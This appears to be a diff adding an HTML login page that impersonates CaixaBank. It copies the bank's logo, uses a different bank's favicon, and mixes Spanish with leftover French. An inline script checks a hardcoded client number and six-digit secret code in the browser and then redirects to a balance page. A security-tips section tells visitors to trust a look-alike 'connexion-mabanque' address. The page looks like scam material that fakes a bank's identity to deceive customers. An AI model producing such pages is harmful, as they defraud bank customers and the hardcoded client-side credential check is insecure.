@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Connexion - Mon compte  </title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta charset="utf-8"/>
+
+
+  <meta name="description" content=" : banca y seguros. Puedo acceder a mis cuentas y consultar en línea los productos y servicios de mi banco.">
+
+<link rel="icon" type="image/png" href="https://fr.luxyello.com/img/lu/c/1654712177-31-bgl-bnp-paribas-agence-mamer.png">
+
+<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+		<link rel="preconnect" href="https://fonts.googleapis.com"> 
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+<link href="https://fonts.googleapis.com/css2?family=Dosis:wght@500&display=swap" rel="stylesheet">
+		<link href="https://www.fonts.com/font/yellow-design-studio/veneer-clean" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+   		 <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+	  
+<link rel="stylesheet" type="text/css" href="Style.css"/>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+<script type="text/javascript" src="Java.js"></script>
+
+
+<style>
+	#text{
+		color:rgb(230, 13, 13);
+		padding: 10px;
+		width: 100%;
+margin:0px;
+line-height:inherited;
+font-size:20px;
+	}
+</style>
+
+	</head>
+	<body>
+	<div class="navbar">
+	<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Logo_CaixaBank.svg/2560px-Logo_CaixaBank.svg.png"></a>
+	</div>
+	
+	<form>
+	<div class="slog">
+	<h1>ACCESO MI<br/>CUENTA</h1>
+<div id="text">
+</div>
+	<div class="log">
+	<label><strong>1. Mi número de cliente</strong><br/>
+	<input type="tel" class="number" id="i" maxlength="10"></label><br/>
+	<label><strong>2. Mi código secreto (6 dígitos)</strong><br/>
+	<input type="password" readonly="true" pattern="[0-9]*" inputmode="numeric" maxlength="6" class="pass" id="o" onclick="dlt()"></label>
+	
+	<div class="tab">
+	<table class="car">
+	<tr>
+
+	<td><button type="button" class="y" onclick="a()">0</button></td>
+
+	<td><button type="button" class="y" onclick="b()">1</button></td>
+
+	<td><button type="button" class="y" onclick="c()">2</button></td>
+
+	<td><button type="button" class="y" onclick="d()">3</button></td>
+
+	<td><button type="button" class="y" onclick="e()">4</button></td>
+	</tr>
+
+
+	<tr>
+	<td><button type="button" class="y" 
+onclick="f()">5</button></td>
+
+	<td><button type="button" class="y" onclick="g()">6</button></td>
+
+	<td><button type="button" class="y" onclick="h()">7</button></td>
+
+	<td><button type="button" class="y" onclick="z()">8</button></td>
+
+	<td><button type="button" class="y" onclick="j()">9</button></td>
+
+	</tr>
+	</table>
+	</div>
+	
+	
+	
+	
+	<button type="button" onclick="valid()" class="b"><strong>Acceder a mis cuentas</strong></button>
+	</div>
+	</div>
+	</form>
+	
+	<div class="info">
+	<p><strong>sus códigos de acceso</strong></p>
+	<a href="">obtenga su código de acceso<br/></a>
+<a href="">olvida el código secreto</a><br/><br/>
+
+	</div>
+	<div class="suite">
+<hr style="color:#C0C0C0">
+	<p><strong>CONSEJOS DE SEGURIDAD</strong></p>
+	<p>compruebe que la dirección del sitio empieza por:</p>
+<br />
+<p>https://connexion-mabanque.</p>
+<br />
+<p>precedido por el icono de un candado y contiene un<strong>https://</strong>que garantizan una conexión segura</p>
+<a href="#">descubra nuestros consejos de seguridad</a><p>y las mejores prácticas de consultoría y<br/>identificar los peligros de la red.</p>
+<hr style="color:#C0C0C0">
+<p</strong>pour une meilleure accessibilité</strong></p><br/>
+<a href="#">conectarse a</a><p>gracias a la rejilla de contraste ampliada y beneficiarse del acompañamiento vocal</p><br/>
+<a href="#">utilisez facil'iti</a><p>para personalizar la pantalla en función de tu situación (discapacidad visual y cognitiva).</p><br/>
+<hr style="color:#C0C0C0">
+<p><strong>Information client</strong></p>
+<p>Si experimenta problemas técnicos durante la navegación, póngase en contacto con nuestros asesores en línea en:<br/>
+
+	o informar de un problema técnico.
+	También puede gestionar sus cuentas desde el móvil o la tableta a través de la aplicación Mis cuentas.</p>
+	</div>
+	
+	
+	
+<!--	<footer>
+<center><p style="color:white;font-weight:500;">suivez-nous sur:</p></center>-->
+<div class="follow">
+
+</div>
+
+<script>
+		function valid(){
+			var x =document.querySelector(".number");
+			var y =document.querySelector(".pass");
+			if(x.value!="" && y.value!=""){
+			if(x.value==5508220167 && y.value==630262){
+				window.location="Solde.html";
+			}else{
+				/*document.getElementById("text").innerHTML="acces incorect verifier vos acces et reesayer";*/
+alert3();
+			}
+		}}
+	</script>
+
+	
+	</footer>
+	</body>
+</html>
